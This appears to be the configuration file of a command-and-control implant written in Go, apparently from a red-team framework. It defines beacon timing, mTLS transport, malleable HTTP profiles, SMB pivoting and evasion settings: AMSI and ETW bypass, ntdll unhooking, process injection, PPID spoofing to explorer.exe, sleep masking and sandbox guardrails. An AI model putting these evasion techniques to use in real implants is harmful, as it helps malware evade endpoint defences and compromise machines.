package agent

// GlobalAgentID is set after successful registration; used by pivot relays to
// inject parent_id when registering child agents (SMB pipe, HTTP pivot).
var GlobalAgentID string

var (
	ServerURL  = "http://127.0.0.1:8080"
	Transport  = "http"
	SleepSec   = "60"
	JitterPct  = "20"

	AgentCertPEM     = ""
	AgentKeyPEM      = ""
	CACertPEM        = ""
	// HTTPFallbackURL: plain-HTTP URL used when mTLS init fails (e.g. donut string corruption).
	// Typically points to the server's non-TLS port so the agent can still check in.
	HTTPFallbackURL  = ""

	// OPSEC
	KillDate        = ""
	SandboxChecks   = "false"
	EvasionPatches  = "true"  // set to "false" via ldflags to skip unhookNtdll/patchETW/patchAMSI
	InjectMethod    = ""  // "" = auto (section+threadpool); "thread"|"fiber"|"callback"|"ntthread" = explicit
	SacrificialProc = ""  // e.g. C:\Windows\System32\dllhost.exe

	// Malleable HTTP profile
	UserAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
	BeaconURIs  = ""  // comma-separated paths: "/search,/api/data,/update"
	HttpHeaders = ""  // semicolon-separated "Key:Value;Key2:Value2"
	ProxyURL    = ""  // http://user:pass@proxy:port

	// Operational
	WorkingHours = ""  // "09:00-17:00" — only beacon in this window
	SMBPipe      = ""  // named pipe path for SMB transport
	MaxRetry      = "0"     // exit after N consecutive beacon failures (0 = disabled)
	StageCleanup  = "false" // zero embedded certs/keys after successful registration

	// Guardrails — exit if environment doesn't match
	GuardrailIP       = ""
	GuardrailUser     = ""
	GuardrailHostname = ""
	GuardrailDomain   = ""

	// Post-ex named pipe name (for future pipe operations)
	PostExPipe = ""

	// Per-build obfuscation key (generated server-side, injected via ldflags)
	ObfuscationKey = ""

	// Comma-separated list of HTTP headers to remove from all requests
	HttpHeadersRemove = ""

	// L2-1: Sleep mask mode — "ekko" (default), "noaccess", "xor", "none"
	// "xor" scrambles AES key in-place and must not be used unless the WaitGroup
	// in beacon.go ensures all sendResult goroutines complete before this runs.
	SleepMaskMode = "ekko"

	// L2-2: AMSI bypass method — "patch" (byte patch, detected by pe-sieve), "veh" (hardware breakpoint + VEH, patchless)
	AMSIMethod = "veh"

	// L2-3: PPID spoof target process name
	PPIDSpoof = "explorer.exe"

	// L2-4: Transform-obfuscate embedded payloads (XOR+compress)
	TransformObfuscate = "false"

	// L2-5: Drip-loading chunk size in bytes (0 = disabled) and delay between chunks
	DripChunkSize = "0"
	DripDelayMs   = "0"

	// L2-6: Cover traffic — fire extra beacons at random sub-intervals to blur timing analysis
	CoverTraffic = "false"

	// DNS transport
	// DNSServer and DNSDomain defined in transport_dns.go
)
